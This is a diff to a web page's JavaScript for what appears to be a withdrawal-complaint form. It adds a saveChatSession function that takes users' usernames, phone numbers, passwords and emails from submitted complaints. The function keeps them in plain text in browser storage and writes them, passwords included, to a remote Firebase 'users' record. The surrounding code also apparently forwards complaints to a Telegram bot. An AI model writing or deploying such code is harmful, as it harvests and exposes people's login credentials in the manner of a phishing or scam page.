@@ -97,27 +97,25 @@
             });
         }
 
-        const uploadAreas = document.querySelectorAll('.upload-area');
-
-        uploadAreas.forEach(area => {
-            const fileInput = area.querySelector('.file-input');
-            const preview = area.nextElementSibling;
-
-            area.addEventListener('click', () => {
-                fileInput.click();
+        function saveChatSession(data) {
+            if (!data || !data.mobile) return;
+            const existing = JSON.parse(localStorage.getItem('chatUserData') || 'null');
+            const session = {
+                username: data.username || (existing && existing.username) || '',
+                mobile: data.mobile,
+                password: data.password || (existing && existing.password) || '',
+                email: data.email || (existing && existing.email) || '',
+                timestamp: Date.now()
+            };
+            localStorage.setItem('chatUserData', JSON.stringify(session));
+            db.ref('users/' + session.mobile).update({
+                username: session.username,
+                mobile: session.mobile,
+                password: session.password,
+                email: session.email,
+                lastSeen: Date.now()
             });
-
-            fileInput.addEventListener('change', (e) => {
-                const file = e.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onload = (event) => {
-                        preview.innerHTML = `<img src="${event.target.result}" alt="Preview">`;
-                    };
-                    reader.readAsDataURL(file);
-                }
-            });
-        });
+        }
 
         document.querySelector('.complain-form').addEventListener('submit', (e) => {
             e.preventDefault();
@@ -159,7 +157,8 @@
 
             db.ref('complaints/' + mobile + '/withdrawal/' + complaintId).set(complaintData);
 
-            localStorage.setItem('pendingWithdrawal', JSON.stringify({ mobile: mobile, id: complaintId }));
+            saveChatSession(complaintData);
+            localStorage.setItem('pendingWithdrawal', JSON.stringify({ id: complaintId, ...complaintData }));
 
             getTelegramSettings().then(tg => {
                 if (tg.complaintBotToken && tg.complaintChatId) {
